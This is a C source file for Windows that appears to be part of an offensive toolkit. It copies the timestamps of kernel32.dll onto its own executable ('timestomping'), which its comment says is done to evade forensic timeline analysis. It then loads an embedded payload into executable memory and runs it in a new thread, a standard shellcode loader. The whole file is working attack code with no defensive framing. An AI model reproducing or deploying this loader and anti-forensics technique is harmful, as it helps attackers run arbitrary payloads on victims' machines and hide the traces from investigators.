#include <windows.h>
#include <stdio.h>
#include "../common/payload.h"

/*
   Timestomping technique:
   Retrieves timestamps from a legitimate Windows system binary (kernel32.dll)
   and applies them to the current running executable / target artifact
   to evade forensic timeline analysis (MFT manipulation).
*/
int main(int argc, char* argv[]) {
    char current_exe[MAX_PATH];
    GetModuleFileNameA(NULL, current_exe, MAX_PATH);

    char sys_dir[MAX_PATH];
    GetSystemDirectoryA(sys_dir, MAX_PATH);

    char kernel32_path[MAX_PATH];
    wsprintfA(kernel32_path, "%s\\kernel32.dll", sys_dir);

    HANDLE hTarget = CreateFileA(kernel32_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hTarget != INVALID_HANDLE_VALUE) {
        FILETIME creationTime, accessTime, writeTime;
        if (GetFileTime(hTarget, &creationTime, &accessTime, &writeTime)) {
            HANDLE hCurrent = CreateFileA(current_exe, FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
            if (hCurrent != INVALID_HANDLE_VALUE) {
                SetFileTime(hCurrent, &creationTime, &accessTime, &writeTime);
                CloseHandle(hCurrent);
            }
        }
        CloseHandle(hTarget);
    }

    /* Execute payload */
    PVOID base = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!base) return 1;

    memcpy(base, payload, payload_len);

    HANDLE th = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)base, NULL, 0, NULL);
    if (th) {
        WaitForSingleObject(th, INFINITE);
        CloseHandle(th);
    }
    return 0;
}
